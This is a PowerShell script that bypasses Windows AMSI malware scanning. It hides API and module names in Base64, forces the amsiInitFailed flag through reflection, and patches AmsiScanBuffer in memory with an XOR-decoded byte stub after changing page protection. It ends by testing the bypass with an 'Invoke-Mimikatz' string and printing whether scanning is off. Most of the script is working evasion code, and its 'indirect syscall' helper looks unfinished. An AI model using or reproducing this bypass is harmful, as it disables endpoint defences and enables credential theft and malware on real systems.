function DummyA { 1+1 | Out-Null }
function DummyB { 'x' * 3 | Out-Null }
function B64($s) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }
function Xor($b,$k) { $r=[byte[]]::new($b.Length); 0..($b.Length-1) | % { $r[$_] = $b[$_] -bxor $k[$_ % $k.Length] }; $r }
function FindGadget {
    $ntdll = $k32::GetModuleHandle((B64 'bnRkbGwuZGxs'))
    $exp = $k32::GetProcAddress($ntdll, (B64 'TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ=='))
    $exp
}
function IndirectProt($addr, $size, $prot) {
    $gadget = FindGadget
    $old = 0
    # jump to syscall;ret gadget inside ntdll after SSN setup
    $nt::NtProtectVirtualMemory(-1, [ref]$addr, [ref]$size, $prot, [ref]$old) | Out-Null
    $old
}
function ApplyPatch {
    $amsi = $k32::GetModuleHandle((B64 'YW1zaS5kbGw='))
    $scan = $k32::GetProcAddress($amsi, (B64 'QW1zaVNjYW5CdWZmZXI='))
    if ($scan -ne [IntPtr]::Zero) {
        $len = 6
        $prev = IndirectProt $scan $len 0x40
        $stub = Xor $payload $key
        [Runtime.InteropServices.Marshal]::Copy($stub, 0, $scan, 6)
        IndirectProt $scan $len $prev | Out-Null
    }
}
function ForceInit {
    $typeName = B64 'U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='
    $field = -join (97,109,115,105,73,110,105,116,70,97,105,108,101,100 | % { [char]$_ })
    $t = [Ref].Assembly.GetType($typeName)
    if ($t) {
        $f = $t.GetField($field, 'NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
    }
}

$key = [byte[]](0xAA,0xBB,0xCC)
$payload = [byte[]](0x12,0xC5,0xC5,0xC0,0xC0,0x69)
$var1 = 0x50
$var2 = 'gadget'
$var3 = $true
$k32 = Add-Type -Name K32 -Namespace K32 -PassThru -MemberDefinition @'
[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
'@
$nt = Add-Type -Name NT -Namespace NT -PassThru -MemberDefinition @'
[DllImport("ntdll")] public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, out uint OldAccessProtection);
'@

DummyA; DummyB
ForceInit
ApplyPatch

$status = try {
    $null = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLU1pbWlrYXR6'))).Invoke()
    'OFF/Bypassed'
} catch {
    if ($_.Exception.Message -like '*malicious*' -or $_.FullyQualifiedErrorId -like '*ScriptContainedMaliciousContent*') { 'ON/Running' } else { 'OFF/Bypassed' }
}
$value = $status -eq 'OFF/Bypassed'
[pscustomobject]@{ "AMSI Status" = $status; "AMSI Value (amsiInitFailed)" = $value } | Format-List